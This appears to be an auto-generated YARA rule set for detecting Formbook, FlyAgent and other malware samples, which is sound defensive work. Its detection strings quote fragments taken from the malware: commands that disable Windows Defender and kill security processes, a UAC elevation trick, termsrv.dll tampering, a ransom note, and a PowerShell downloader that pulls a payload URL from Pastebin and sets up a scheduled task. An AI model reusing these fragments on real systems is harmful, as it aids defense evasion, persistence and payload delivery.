/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-28
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d9731999 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d9731999.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d97319994f6ff53d32b4a06804a7e234516aa17b257a5976281a3f48dcac15ea"
   strings:
      $x1 = ">nul 2>&1 powershell -WindowStyle Hidden -noprofile -executionpolicy bypass -file \"%temp%\\Windows.10.Defender_Uninstall.ps1\"" fullword ascii /* score: '44.00'*/
      $x2 = ">nul 2>&1 reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MRT.ex" ascii /* score: '34.00'*/
      $x3 = ">\"%temp%\\Elevate.vbs\" echo CreateObject^(\"Shell.Application\"^).ShellExecute \"%~dpf0\", \"%*\" , \"\", \"runas\", 1" fullword ascii /* score: '32.00'*/
      $x4 = " do {sleep 7} while ((gwmi win32_process -filter 'name=\"explorer.exe\"'|? {$_.getownersid().sid -eq \"S-1-5-18\"}))" fullword ascii /* score: '31.00'*/
      $x5 = "        for /f \"tokens=*\" %%g in ('dir /b/s /a-d %targetFolder%') do move /y \"%%g\" \"%temp%\"" fullword ascii /* score: '31.00'*/
      $x6 = ">nul 2>&1 REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /f /v PreventOverride /t REG_DWOR" ascii /* score: '31.00'*/
      $x7 = ">nul 2>&1 REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /f /v PreventOverride /t REG_DWOR" ascii /* score: '31.00'*/
      $s8 = " $out=@($null,\"powershell -WindowStyle Hidden -win 1 -nop -c iex `$env:A\",0,0,0,$w,0,$null,($A4 -as $T[4]),($A5 -as $T[5])); F" ascii /* score: '29.00'*/
      $s9 = "for %%A IN (SecurityHealthService.exe, SecurityHealthSystray.exe, smartscreen.exe, MpCmdRun.exe) do >nul 2>&1 taskkill /im %%A" fullword ascii /* score: '28.00'*/
      $s10 = "whoami|>nul findstr /i /c:\"nt authority\\system\" && (" fullword ascii /* score: '27.00'*/
      $s11 = "} else { $env:A=''; $PRIV=[uri].module.gettype(\"System.Diagnostics.Process\").\"GetMeth`ods\"(42) |? {$_.Name -eq \"SetPrivileg" ascii /* score: '27.00'*/
      $s12 = "$D1=[uri].module.gettype('System.Diagnostics.Process').\"GetM`ethods\"(42) |where {$_.Name -eq 'SetPrivilege'} #`:no-ev-warn" fullword ascii /* score: '27.00'*/
      $s13 = ">nul \"%temp%\\Elevate.vbs\" )" fullword ascii /* score: '27.00'*/
      $s14 = ">nul 2>&1 REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /f /v EnableWebContentEvaluation " ascii /* score: '26.00'*/
      $s15 = ">nul 2>&1 REG ADD \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost\" /f /v EnableWebContentEvaluation " ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      1 of ($x*) and all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__95c305c5 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_95c305c5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "95c305c5d89970d7d4fbbe0649543d2286d21c678af50ef80ceebb360b0a3cbf"
   strings:
      $s1 = "sTJN.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.lipsum.com/" fullword wide /* score: '17.00'*/
      $s3 = "tempora" fullword wide /* score: '15.00'*/
      $s4 = "sTJN.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "quaerat" fullword wide /* score: '13.00'*/
      $s6 = "commodo" fullword wide /* score: '11.00'*/
      $s7 = "deserunt" fullword wide /* score: '11.00'*/
      $s8 = "commodi" fullword wide /* score: '11.00'*/
      $s9 = "\"Paragraph Number\",\"Content\",\"Word Count\"" fullword wide /* score: '11.00'*/
      $s10 = "ContentFormatter" fullword ascii /* score: '9.00'*/
      $s11 = "contentFormatter" fullword ascii /* score: '9.00'*/
      $s12 = "UFTPXO" fullword ascii /* score: '8.50'*/
      $s13 = "ojjhmjj" fullword ascii /* score: '8.00'*/
      $s14 = "consectetur" fullword wide /* score: '8.00'*/
      $s15 = "adipiscing" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d283fd9c {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d283fd9c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d283fd9c97a9f6a6d6242860aa9c0b54a1091c3c410c5fd2fa9bc567b8332520"
   strings:
      $x1 = "C:\\Windows\\System32\\rundll32.exe shell32.dll,#61" fullword wide /* score: '35.00'*/
      $s2 = "C:\\Users\\ZNZ\\AppData\\Local\\Programs\\atomic" fullword wide /* score: '30.00'*/
      $s3 = "C:\\Users\\Admin\\AppData\\Local\\Programs\\atomic" fullword wide /* score: '30.00'*/
      $s4 = "\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -no-remote" fullword wide /* score: '29.00'*/
      $s5 = "\\AppData\\Local\\Programs\\Opera GX\\launcher.exe\" --no-sandbox --disable-gpu" fullword wide /* score: '27.00'*/
      $s6 = "\\AppData\\Local\\Programs\\Opera GX\\opera.exe" fullword wide /* score: '27.00'*/
      $s7 = "\\AppData\\Local\\Programs\\Opera GX\\launcher.exe" fullword wide /* score: '27.00'*/
      $s8 = "C:\\Program Files\\Opera\\opera.exe" fullword wide /* score: '26.00'*/
      $s9 = "C:\\Program Files (x86)\\Opera\\opera.exe" fullword wide /* score: '26.00'*/
      $s10 = "C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe" fullword wide /* score: '26.00'*/
      $s11 = "C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe" fullword wide /* score: '26.00'*/
      $s12 = "C:\\Program Files\\Mozilla Firefox\\firefox.exe" fullword wide /* score: '26.00'*/
      $s13 = "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe" fullword wide /* score: '26.00'*/
      $s14 = "Mutex error attempt {0}: {1}" fullword wide /* score: '25.00'*/
      $s15 = "First Opera GX clone attempt failed, killing processes and retrying..." fullword wide /* score: '25.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__76139fef {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_76139fef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "76139fef0e7b8344d2955f69df014614839ba3fc153af9f8e66a35369ac17bc4"
   strings:
      $s1 = "ExecuteFullPipeline" fullword ascii /* score: '24.00'*/
      $s2 = "PSSSSSS.exe" fullword wide /* score: '22.00'*/
      $s3 = "ANewtonsoft.Json.Linq.JsonPath.QueryScanFilter+<ExecuteFilter>d__2" fullword ascii /* score: '22.00'*/
      $s4 = "DNewtonsoft.Json.Linq.JsonPath.ScanMultipleFilter+<ExecuteFilter>d__2" fullword ascii /* score: '22.00'*/
      $s5 = "get_ExecutionTime" fullword ascii /* score: '21.00'*/
      $s6 = "System.Collections.Generic.ICollection<System.Collections.Generic.KeyValuePair<System.String,Newtonsoft.Json.Linq.JToken>>.get_I" ascii /* score: '21.00'*/
      $s7 = "JNewtonsoft.Json.Linq.JsonPath.ArrayMultipleIndexFilter+<ExecuteFilter>d__2" fullword ascii /* score: '21.00'*/
      $s8 = "ENewtonsoft.Json.Linq.JsonPath.FieldMultipleFilter+<ExecuteFilter>d__2" fullword ascii /* score: '21.00'*/
      $s9 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,Newtonsoft.Json.Linq.JToken>>.get_C" ascii /* score: '21.00'*/
      $s10 = "CNewtonsoft.Json.Linq.JsonPath.ArraySliceFilter+<ExecuteFilter>d__12" fullword ascii /* score: '21.00'*/
      $s11 = "BNewtonsoft.Json.Linq.JsonPath.ArrayIndexFilter+<ExecuteFilter>d__4" fullword ascii /* score: '21.00'*/
      $s12 = "get_ProcessDictionaryKeys" fullword ascii /* score: '20.00'*/
      $s13 = "get_ProcessExtensionDataNames" fullword ascii /* score: '20.00'*/
      $s14 = "System.Runtime.CompilerServices.IsByRefLikeAttribute" fullword wide /* score: '20.00'*/
      $s15 = "<Newtonsoft.Json.Linq.JsonPath.ScanFilter+<ExecuteFilter>d__2" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule FlyAgent_signature__4db93e2aaf03510d947468cb50ce86cc_imphash_ {
   meta:
      description = "_subset_batch - file FlyAgent(signature)_4db93e2aaf03510d947468cb50ce86cc(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "efcba32782b854043e965b2fe06e115d782d7346eee9d84b475a7d1f6b80c8d9"
   strings:
      $x1 = "cmd.exe /c del svchcst.exe" fullword ascii /* score: '44.00'*/
      $x2 = "taskkill /im cmd.exe" fullword ascii /* score: '41.00'*/
      $x3 = "CMD /C Attrib +H +S +R %SystemRoot%\\System32\\termsrvs.dll" fullword ascii /* score: '41.00'*/
      $x4 = "echo y|cacls %systemroot%\\system32\\termsrv.dll /C /G Administrators:F SYSTEM:F Everyone:Fc:\\windows\\system32\\termsrv.dll" fullword ascii /* score: '38.00'*/
      $x5 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $x6 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '35.00'*/
      $x7 = "C:\\WINDOWS\\system32\\termsrv.dll" fullword ascii /* score: '34.00'*/
      $x8 = "takeown /F c:\\windows\\system32\\termsrv.dll /A" fullword ascii /* score: '34.00'*/
      $x9 = "C:\\WINDOWS\\system32\\Termsrvs.dll" fullword ascii /* score: '34.00'*/
      $x10 = "cmd.exe /c del " fullword ascii /* score: '33.00'*/
      $x11 = "%SystemRoot%\\System32\\termsrvs.dll" fullword ascii /* score: '32.00'*/
      $x12 = "<Span> <!-- preprocessor directives that allows comments -->" fullword ascii /* score: '31.00'*/
      $x13 = "<Span> <!-- preprocessor directives that don't allow comments -->" fullword ascii /* score: '31.00'*/
      $s14 = "@cmd.exe" fullword ascii /* score: '30.00'*/
      $s15 = "atl.dll" fullword ascii /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and all of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__afcc4014 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_afcc4014.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "afcc401404ec5b001aeb0a9eb2ac93c7c282c969a76d36d17b1ded713ccfdd3f"
   strings:
      $s1 = "ZlNp.exe" fullword wide /* score: '22.00'*/
      $s2 = "Batch processing completed!" fullword wide /* score: '18.00'*/
      $s3 = "https://github.com/css-minifier" fullword wide /* score: '17.00'*/
      $s4 = "btnProcessAll_Click" fullword ascii /* score: '15.00'*/
      $s5 = "btnProcessAll" fullword wide /* score: '15.00'*/
      $s6 = "Process All" fullword wide /* score: '15.00'*/
      $s7 = " Batch processing" fullword wide /* score: '15.00'*/
      $s8 = "ZlNp.pdb" fullword ascii /* score: '14.00'*/
      $s9 = "cssContent" fullword ascii /* score: '9.00'*/
      $s10 = "GetOptimizerSettings" fullword ascii /* score: '9.00'*/
      $s11 = "GetMinifierSettings" fullword ascii /* score: '9.00'*/
      $s12 = "File Manager" fullword wide /* PEStudio Blacklist: strings */ /* score: '9.00'*/
      $s13 = "Remove Comments" fullword wide /* score: '9.00'*/
      $s14 = " Combine selectors" fullword wide /* score: '9.00'*/
      $s15 = "y4`%I%" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fb950059 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fb950059.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fb950059d4dbf088a3f81339ba49bb503db94d915f1dc5707eaed1bffe7ba263"
   strings:
      $s1 = "ucTW.exe" fullword wide /* score: '22.00'*/
      $s2 = "targetColumnName" fullword ascii /* score: '14.00'*/
      $s3 = "set_HasHeaders" fullword ascii /* score: '12.00'*/
      $s4 = "CSV Viewer - " fullword wide /* score: '12.00'*/
      $s5 = ".NET Framework 4.5A" fullword ascii /* score: '10.00'*/
      $s6 = "GetSelectedRowCount" fullword ascii /* score: '9.00'*/
      $s7 = "AddColumnDialog" fullword ascii /* score: '9.00'*/
      $s8 = "GetColumnFormat" fullword ascii /* score: '9.00'*/
      $s9 = "csvContent" fullword ascii /* score: '9.00'*/
      $s10 = "GetSelectedRowIndices" fullword ascii /* score: '9.00'*/
      $s11 = "3~33>\"0&" fullword ascii /* score: '9.00'*/ /* hex encoded string '30' */
      $s12 = "GetFormattedColumnNames" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__adf8f257 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_adf8f257.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "adf8f2572d50a7af9af7512742520644479904c5973cad6aafa5b6e83516e36f"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\wuDmlejXVn\\src\\obj\\Debug\\ykSI.pdb" fullword ascii /* score: '40.00'*/
      $x2 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutra" ascii /* score: '31.00'*/
      $s3 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '28.00'*/
      $s4 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '28.00'*/
      $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADd" fullword ascii /* score: '27.00'*/
      $s6 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, PublicKeyT" ascii /* score: '25.00'*/
      $s7 = "ykSI.exe" fullword wide /* score: '22.00'*/
      $s8 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerPropertyEditor, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutra" ascii /* score: '19.00'*/
      $s9 = "Microsoft.VSDesigner.DataSource.Design.TableAdapterManagerDesigner, Microsoft.VSDesigner, Version=10.0.0.0, Culture=neutral, Pub" ascii /* score: '19.00'*/
      $s10 = "http://tempuri.org/MembershipDataSet.xsd" fullword wide /* score: '17.00'*/
      $s11 = "l, PublicKeyToken=b03f5f7f11d50a3a\"System.Drawing.Design.UITypeEditor" fullword ascii /* score: '16.00'*/
      $s12 = "get_DescriptionColumn" fullword ascii /* score: '15.00'*/
      $s13 = "get_CityGymLogo" fullword ascii /* score: '14.00'*/
      $s14 = "get_MembershipConnectionString" fullword ascii /* score: '12.00'*/
      $s15 = "get_AddressColumn" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__d80facfa {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d80facfa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "d80facfa346ecda27da4c7f73196ae766bc21bd3bc6f7828ecc9b390985fb92f"
   strings:
      $x1 = "cmd.exe /c cd \"" fullword wide /* score: '33.00'*/
      $x2 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, Sys" ascii /* score: '32.00'*/
      $s3 = "on=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089jSystem.CodeDom.MemberAttributes, System, Version=4.0.0.0, Culture=n" ascii /* score: '29.00'*/
      $s4 = " & echo [%RANDOM%] Ooops! Your files are encrypted! Telegram for contact: @test2 1>info-Locker.txt & attrib -h +s +r info-Locker" wide /* score: '28.00'*/
      $s5 = "fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, Sys" ascii /* score: '27.00'*/
      $s6 = "tem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3amSystem.Globalization.CultureInfo, mscorlib, Versi" ascii /* score: '27.00'*/
      $s7 = "/k %SystemRoot%\\Explorer.exe" fullword wide /* score: '27.00'*/
      $s8 = "AWindowsService.exe" fullword wide /* score: '25.00'*/
      $s9 = "System.exe" fullword wide /* score: '25.00'*/
      $s10 = "%systemdrive%\\Users\\Public\\Desktop" fullword wide /* score: '25.00'*/
      $s11 = "ux-cryptor.exe" fullword wide /* score: '24.00'*/
      $s12 = "native.exe" fullword wide /* score: '22.00'*/
      $s13 = "crypt0rsx.exe" fullword wide /* score: '22.00'*/
      $s14 = "taskkill.exe /im Explorer.exe /f" fullword wide /* score: '22.00'*/
      $s15 = " & del info-Locker.txt /q /s & attrib +h +s -r desktop.ini" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      1 of ($x*) and 4 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__82e88aee {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_82e88aee.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "82e88aee6d885cc8fae05704f51ff929dec75169571981b383292566268aa885"
   strings:
      $s1 = "GetProcessExecutablePath" fullword ascii /* score: '29.00'*/
      $s2 = "GetProcessCpuUsage" fullword ascii /* score: '25.00'*/
      $s3 = "SELECT ExecutablePath FROM Win32_Process WHERE ProcessId = {0}" fullword wide /* score: '24.00'*/
      $s4 = "Failed to get process memory information: " fullword wide /* score: '23.00'*/
      $s5 = "Failed to get process details: " fullword wide /* score: '23.00'*/
      $s6 = "Failed to get process details for PID {0}: {1}" fullword wide /* score: '23.00'*/
      $s7 = "DSmq.exe" fullword wide /* score: '22.00'*/
      $s8 = "get_MaxProcessesToShow" fullword ascii /* score: '20.00'*/
      $s9 = "2Real-time RAM Usage Monitor with Process Breakdown" fullword ascii /* score: '20.00'*/
      $s10 = "GetAllProcessDetails" fullword ascii /* score: '20.00'*/
      $s11 = "GetTopCpuProcesses" fullword ascii /* score: '20.00'*/
      $s12 = "GetProcessDetails" fullword ascii /* score: '20.00'*/
      $s13 = "<GetProcessesByName>b__0" fullword ascii /* score: '20.00'*/
      $s14 = "get_AutoKillProcesses" fullword ascii /* score: '20.00'*/
      $s15 = "get_ProcessesToAutoKill" fullword ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fc039ad2 {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fc039ad2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fc039ad25b39ddf44318da5677c76c4273df5b74c5f9988985d7458c816c4dbc"
   strings:
      $s1 = "utgT.exe" fullword wide /* score: '22.00'*/
      $s2 = "utgT.pdb" fullword ascii /* score: '14.00'*/
      $s3 = "Overall: {0:F2}% ({1}) - GPA: {2:F2}" fullword wide /* score: '12.00'*/
      $s4 = "Overall: 0.00% (F) - GPA: 0.00" fullword wide /* score: '12.00'*/
      $s5 = "{0}: {1:F1}% ({2} items) - Weight: {3:P0}" fullword wide /* score: '12.00'*/
      $s6 = "Text files (*.txt)|*.txt|All files (*.*)|*.*" fullword wide /* score: '11.00'*/
      $s7 = "Error exporting report: " fullword wide /* score: '10.00'*/
      $s8 = "get_AssignmentName" fullword ascii /* score: '9.00'*/
      $s9 = "GetAllGrades" fullword ascii /* score: '9.00'*/
      $s10 = "GetLetterGrade" fullword ascii /* score: '9.00'*/
      $s11 = "GetWeightedPoints" fullword ascii /* score: '9.00'*/
      $s12 = "GetGradeCount" fullword ascii /* score: '9.00'*/
      $s13 = "GetOverallAverage" fullword ascii /* score: '9.00'*/
      $s14 = "PercentageToGPA" fullword ascii /* score: '9.00'*/
      $s15 = "PercentageToLetterGrade" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f2495b22 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f2495b22.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f2495b22b4c0613adec4de02ffcee7974540d71e34edd20fabe0bba675d3cfd5"
   strings:
      $s1 = "script.exe" fullword wide /* score: '28.00'*/
      $s2 = "        $action = New-ScheduledTaskAction -Execute $tempPath -ErrorAction SilentlyContinue" fullword ascii /* score: '27.00'*/
      $s3 = "if (Download-FileWithRetries -url $githubUrl -output $tempPath) {" fullword ascii /* score: '21.00'*/
      $s4 = "    # Execute as background process" fullword ascii /* score: '21.00'*/
      $s5 = "$tempPath = Join-Path $hiddenFolder \"background.exe\"" fullword ascii /* score: '18.00'*/
      $s6 = "        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest -ErrorAction SilentlyCont" ascii /* score: '17.00'*/
      $s7 = "$pastebinUrl = \"https://pastebin.com/raw/B0vw8ptu\"" fullword ascii /* score: '17.00'*/
      $s8 = "        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest -ErrorAction SilentlyCont" ascii /* score: '17.00'*/
      $s9 = "# Main execution" fullword ascii /* score: '16.00'*/
      $s10 = "# Get GitHub URL from Pastebin" fullword ascii /* score: '16.00'*/
      $s11 = "script.ps1" fullword wide /* score: '14.00'*/
      $s12 = "    $githubUrl = (Invoke-WebRequest -Uri $pastebinUrl -UseBasicParsing -ErrorAction Stop).Content.Trim()" fullword ascii /* score: '14.00'*/
      $s13 = "        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden" fullword ascii /* score: '14.00'*/
      $s14 = "        $trigger = New-ScheduledTaskTrigger -AtLogOn -ErrorAction SilentlyContinue" fullword ascii /* score: '14.00'*/
      $s15 = "        $startInfo.UseShellExecute = $true" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0f300bbb {
   meta:
      description = "_subset_batch - file Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0f300bbb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0f300bbb9ae586f438ef75fe284ce0818111c1515923d27e7c1986b5dba6dce5"
   strings:
      $x1 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_27_ProcessNextFileAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicK" ascii /* score: '34.00'*/
      $x2 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_27_ProcessNextFileAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicK" ascii /* score: '31.00'*/
      $x3 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_36_GetOrFetchEntrySeqID, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicK" ascii /* score: '31.00'*/
      $s4 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_38_ParseIGCFileAndCheckIfAlreadyUploaded, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture" ascii /* score: '29.00'*/
      $s5 = "https://github.com/siglr/DiscordPostHelper/releases/download/" fullword wide /* score: '28.00'*/
      $s6 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_39_SaveIgcRecordForBatchAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, P" ascii /* score: '26.00'*/
      $s7 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_31_ClickElementAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicKeyT" ascii /* score: '26.00'*/
      $s8 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_28_ExtractResults, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicKeyToke" ascii /* score: '26.00'*/
      $s9 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_29_WaitForConditionAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, Public" ascii /* score: '26.00'*/
      $s10 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_37_IGCFlightPlanMatchedTaskID, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, P" ascii /* score: '26.00'*/
      $s11 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_30_ClickElementByIdAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, Public" ascii /* score: '26.00'*/
      $s12 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_36_GetOrFetchEntrySeqID, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicK" ascii /* score: '25.00'*/
      $s13 = "H:\\DiscordHelper - 4.8.1\\DiscordHelper\\{0}.VersionInfo.xml" fullword wide /* score: '24.00'*/
      $s14 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_31_ClickElementAsync, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicKeyT" ascii /* score: '23.00'*/
      $s15 = "HaraiamCoin.WSGBatchUpload+VB$StateMachine_28_ExtractResults, nFm4Ck9d7ggDeA, Version=19.6.36.85, Culture=neutral, PublicKeyToke" ascii /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__159ab3a2 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_159ab3a2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "159ab3a2553adc37be748107b6faafb4e90ccf398b58a23369194848f2e94413"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<Serilog.Parsing.MessageTemplateToken>.get_Current" fullword ascii /* score: '30.00'*/
      $s2 = "System.Collections.Generic.IEnumerator<Serilog.Parsing.MessageTemplateToken>.Current" fullword ascii /* score: '30.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<Serilog.Parsing.MessageTemplateToken>.GetEnumerator" fullword ascii /* score: '30.00'*/
      $s4 = "System.Collections.Generic.IEnumerator<Serilog.Events.LogEventProperty>.get_Current" fullword ascii /* score: '24.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<Serilog.Events.LogEventProperty>.GetEnumerator" fullword ascii /* score: '24.00'*/
      $s6 = "Sdajzuhmlna.exe" fullword wide /* score: '22.00'*/
      $s7 = "RunOperationalExecutor" fullword ascii /* score: '21.00'*/
      $s8 = "GetStaticExecutor" fullword ascii /* score: '21.00'*/
      $s9 = "LoggerTemplate" fullword ascii /* score: '21.00'*/
      $s10 = "GetSymbolicExecutor" fullword ascii /* score: '21.00'*/
      $s11 = "Serilog.Comparisons" fullword ascii /* score: '19.00'*/
      $s12 = "GetRemoteDecryptor" fullword ascii /* score: '19.00'*/
      $s13 = "Serilog.Compilers" fullword ascii /* score: '19.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<Serilog.Events.LogEventProperty>.Current" fullword ascii /* score: '19.00'*/
      $s15 = "ComparatorProcessor" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule e013f82ecabef457fa9560e9d5f486cf3d51f71019210a34e8aecb989bb8d97a_e013f82e {
   meta:
